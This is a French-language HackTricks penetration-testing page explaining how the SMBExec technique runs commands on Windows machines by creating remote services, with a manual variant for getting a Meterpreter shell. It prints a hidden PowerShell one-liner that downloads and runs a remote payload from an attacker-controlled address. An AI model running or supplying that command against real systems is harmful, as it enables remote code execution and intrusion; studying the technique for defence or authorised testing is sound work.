# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Comment ça fonctionne

**Smbexec fonctionne comme Psexec.** Dans cet exemple, **au lieu** de pointer le "_binpath_" vers un exécutable malveillant à l'intérieur de la victime, nous allons **le pointer** vers **cmd.exe ou powershell.exe** et l'un d'eux téléchargera et exécutera la porte dérobée.

## **SMBExec**

Voyons ce qui se passe lorsque smbexec s'exécute en le regardant du côté des attaquants et de la cible :

![](../../.gitbook/assets/smbexec\_prompt.png)

Nous savons donc qu'il crée un service "BTOBTO". Mais ce service n'est pas présent sur la machine cible lorsque nous effectuons une `sc query`. Les journaux système révèlent un indice sur ce qui s'est passé :

![](../../.gitbook/assets/smbexec\_service.png)

Le nom de fichier de service contient une chaîne de commande à exécuter (%COMSPEC% pointe vers le chemin absolu de cmd.exe). Il affiche la commande à exécuter dans un fichier bat, redirige la sortie standard et d'erreur vers un fichier Temp, puis exécute le fichier bat et le supprime. De retour sur Kali, le script Python récupère ensuite le fichier de sortie via SMB et affiche le contenu dans notre "pseudo-shell". Pour chaque commande que nous tapons dans notre "shell", un nouveau service est créé et le processus est répété. C'est pourquoi il n'a pas besoin de déposer un binaire, il exécute simplement chaque commande souhaitée en tant que nouveau service. Certainement plus discret, mais comme nous l'avons vu, un journal d'événements est créé pour chaque commande exécutée. Toujours une façon très astucieuse d'obtenir un "shell" non interactif !

## SMBExec manuel

**Ou exécution de commandes via des services**

Comme smbexec l'a démontré, il est possible d'exécuter des commandes directement à partir de binPaths de service au lieu d'avoir besoin d'un binaire. Cela peut être une astuce utile à garder dans votre poche si vous avez juste besoin d'exécuter une commande arbitraire sur une machine Windows cible. À titre d'exemple rapide, obtenons une shell Meterpreter en utilisant un service distant _sans_ binaire.

Nous utiliserons le module `web_delivery` de Metasploit et choisirons une cible PowerShell avec une charge utile Meterpreter inversée. Le listener est configuré et il nous indique la commande à exécuter sur la machine cible :
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');  
```
À partir de notre boîte d'attaque Windows, nous créons un service distant ("metpsh") et définissons le binPath pour exécuter cmd.exe avec notre charge utile :

![](../../.gitbook/assets/sc_psh_create.png)

Ensuite, nous le démarrons :

![](../../.gitbook/assets/sc_psh_start.png)

Il échoue car notre service ne répond pas, mais si nous regardons notre écouteur Metasploit, nous voyons que l'appel a été effectué et que la charge utile a été exécutée.

Toutes les informations ont été extraites d'ici : [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
